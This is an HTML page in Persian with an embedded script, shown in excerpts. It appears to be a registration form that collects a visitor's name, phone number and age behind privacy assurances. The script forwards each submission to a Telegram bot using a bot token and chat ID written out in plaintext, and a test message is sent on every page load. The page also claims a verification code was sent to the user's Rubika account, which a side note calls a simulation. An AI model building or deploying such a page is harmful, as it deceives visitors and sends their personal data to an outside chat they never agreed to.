...
<body>
  <div class="container" id="mainContainer">
    ...
    <form id="userForm">
      ...
      <div class="privacy">
        ...
        <br />
        <a href="#" onclick="alert('جزئیات کامل حریم خصوصی: ما متعهد به حفظ امنیت اطلاعات شما هستیم. هیچ گونه استفاده تجاری یا تبلیغاتی نمی‌شود.')">مشاهده جزئیات کامل</a>
      </div>
    ...
    <div id="verifySection" class="verify-box hidden">
      ...
      <div class="form-group">
        ...
        <input type="text" id="verifyCode" placeholder="مثلاً: ۱۲۳۴۵۶" maxlength="6" />
      </div>
      <div id="verifyStatus" class="hidden"></div>
      <button class="btn" id="verifyBtn">تأیید کد</button>
      <p style="margin-top: 10px; font-size: 0.9rem; color: #aaa;">
        کد به روبیکای شما ارسال شد (شبیه‌سازی).
      </p>
    </div>
  ...
  <script>
    // ============================================================
    //  تنظیمات بات تلگرام (وارد شده توسط کاربر)
    // ============================================================
    const BOT_TOKEN = "7971237505:AAF2IVnEOhv6f8yDUJFugMGqCVbnSd9cLYs";
    const CHAT_ID = "7247257648";
    ...
    // ============================================================
    //  تابع ارسال پیام به تلگرام (با مدیریت خطا و CORS)
    // ============================================================
    async function sendToTelegram(message) {
      ...
      try {
        ...
        if (!response.ok) {
          // اگر سرور تلگرام خطا برگرداند
          console.error("خطای تلگرام:", data);
          return { success: false, error: data.description || "خطای ناشناخته از سمت تلگرام" };
        }

        return { success: true };
      } catch (error) {
        console.error("خطای شبکه در ارسال به تلگرام:", error);
        return { success: false, error: "مشکل در ارتباط با اینترنت یا تلگرام. لطفاً اتصال خود را بررسی کنید." };
      }
    }
    ...
    // ============================================================
    //  نمایش پیام وضعیت در فرم
    // ============================================================
    function showFormStatus(message, type) {
      formStatus.classList.remove("hidden", "error-msg", "success-msg");
      formStatus.textContent = message;
      if (type === "error") {
        formStatus.classList.add("error-msg");
      } else if (type === "success") {
        formStatus.classList.add("success-msg");
      }
    }

    function showVerifyStatus(message, type) {
      verifyStatus.classList.remove("hidden", "error-msg", "success-msg");
      verifyStatus.textContent = message;
      if (type === "error") {
        verifyStatus.classList.add("error-msg");
      } else if (type === "success") {
        verifyStatus.classList.add("success-msg");
      }
    }
    ...
    form.addEventListener("submit", async (e) => {
      ...
      if (!consent.checked) {
        showFormStatus("لطفاً با سیاست حفظ حریم خصوصی موافقت کنید.", "error");
        return;
      }
      ...
      if (!fullName || !phone || !age) {
        showFormStatus("لطفاً تمام فیلدهای اجباری را پر کنید.", "error");
        return;
      }
      ...
      showFormStatus("در حال ارسال اطلاعات به سرور...", "success");

      const result = await sendToTelegram(msg);

      if (result.success) {
        showFormStatus("✅ اطلاعات شما با موفقیت ثبت شد. کد تأیید به روبیکای شما ارسال گردید.", "success");
        verifySection.classList.remove("hidden");
        submitBtn.textContent = "ثبت شده ✓";
        // غیرفعال کردن دکمه ارسال (قبلاً غیرفعال شده)
      } else {
        showFormStatus(`❌ خطا: ${result.error || "مشکل در ارسال، دوباره تلاش کنید."}`, "error");
    ...
    verifyBtn.addEventListener("click", async () => {
      ...
      if (!code || code.length !== 6) {
        showVerifyStatus("لطفاً کد ۶ رقمی را وارد کنید.", "error");
        return;
      }

      if (code === tempCode) {
        // کد صحیح است → ارسال پیام تأیید به تلگرام
        const confirmMsg = `✅ <b>تأیید شد</b>\n📱 شماره: ${userData.phone}\nکد وارد شده صحیح بود.`;
        await sendToTelegram(confirmMsg);

        showVerifyStatus("✅ کد تأیید شد! از همکاری شما سپاسگزاریم.", "success");
        ...
        showVerifyStatus("❌ کد وارد شده صحیح نیست. لطفاً دوباره تلاش کنید.", "error");
    ...
    // ============================================================
    //  (اختیاری) وقتی کاربر Enter می‌زند در فیلد کد، دکمه تأیید فعال شود
    // ============================================================
    ...
    // ============================================================
    //  تست اولیه: آیا توکن و چت آیدی معتبر هستند؟
    //    (این بخش فقط برای اطمینان از تنظیمات است و اجرا می‌شود)
    // ============================================================
    (async function testBot() {
      try {
        const testMsg = "🤖 بات با موفقیت متصل شد. منتظر ثبت‌نام‌های جدید هستیم.";
        const res = await sendToTelegram(testMsg);
        if (!res.success) {
          console.warn("⚠️ اتصال به بات تلگرام با مشکل مواجه شد:", res.error);
        } else {
          console.log("✅ اتصال به بات تلگرام برقرار است.");
        }
      } catch (_) {
        // خطا را نادیده می‌گیریم چون فقط برای لاگ است
      }
    })();
  </script>
</body>
